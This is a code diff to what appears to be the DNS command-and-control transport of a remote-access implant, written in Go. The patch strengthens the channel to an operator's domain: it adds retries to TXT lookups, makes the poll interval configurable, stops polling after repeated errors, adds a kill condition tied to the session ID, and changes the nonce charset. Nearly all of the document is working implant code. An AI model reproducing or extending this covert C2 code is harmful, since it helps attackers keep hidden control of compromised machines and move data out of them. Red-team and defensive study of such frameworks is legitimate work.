@@ -71,9 +71,8 @@ const (
 )
 
 var (
-	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
-
-	pollInterval = 1 * time.Second
+	//Removed "-" because it appears a nonce that ends in "-" is invalid and thus breaks comms
+	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789_")
 
 	replayMutex = &sync.RWMutex{}
 	replay      = &map[string]bool{}
@@ -119,17 +118,30 @@ func isReplayAttack(ciphertext []byte) bool {
 // --------------------------- DNS SESSION SEND ---------------------------
 
 func dnsLookup(domain string) (string, error) {
+	var err error
+	var txts []string
+
 	// {{if .Config.Debug}}
 	log.Printf("[dns] lookup -> %s", domain)
 	// {{end}}
-	txts, err := net.LookupTXT(domain)
-	if err != nil || len(txts) == 0 {
-		// {{if .Config.Debug}}
-		log.Printf("[!] failure -> %s", domain)
-		// {{end}}
-		return "", err
+	for retryCount := 0; retryCount < 3; retryCount++ {
+		txts, err = net.LookupTXT(domain)
+		if err != nil || len(txts) == 0 {
+			// {{if .Config.Debug}}
+			log.Printf("[!] failure -> %s", domain)
+			// {{end}}
+		} else {
+			break
+		}
+		// Sleep for a second before retry
+		// TODO: Make configurable
+		time.Sleep(250 * time.Millisecond)
 	}
-	return strings.Join(txts, ""), nil
+	if err != nil || len(txts) == 0 {
+		return "", err
+	} else {
+		return strings.Join(txts, ""), nil
+	}
 }
 
 // Send raw bytes of an arbitrary length to the server
@@ -341,11 +353,12 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 // --------------------------- DNS SESSION RECV ---------------------------
 
 func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
+	error_counter := 0
 	for {
 		select {
 		case <-ctrl:
 			return
-		case <-time.After(pollInterval):
+		case <-time.After(GetPollInterval()):
 			nonce := dnsNonce(nonceStdSize)
 			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
 			txt, err := dnsLookup(domain)
@@ -353,7 +366,14 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 				// {{if .Config.Debug}}
 				log.Printf("Lookup error %v", err)
 				// {{end}}
+				error_counter += 1
+				if error_counter > 3 {
+					return
+				}
+			} else {
+				error_counter = 0
 			}
+
 			if txt == "0" {
 				continue
 			}
@@ -367,9 +387,14 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			}
 			pollData, err := GCMDecrypt(sessionKey, rawTxt)
 			if err != nil {
+				strTxt := string(rawTxt[:])
 				// {{if .Config.Debug}}
 				log.Printf("Failed to decrypt poll response")
+				log.Printf("TXT: %s", strTxt)
 				// {{end}}
+				if strTxt == sessionID {
+					return
+				}
 				break
 			}
 			dnsPoll := &pb.DNSPoll{}
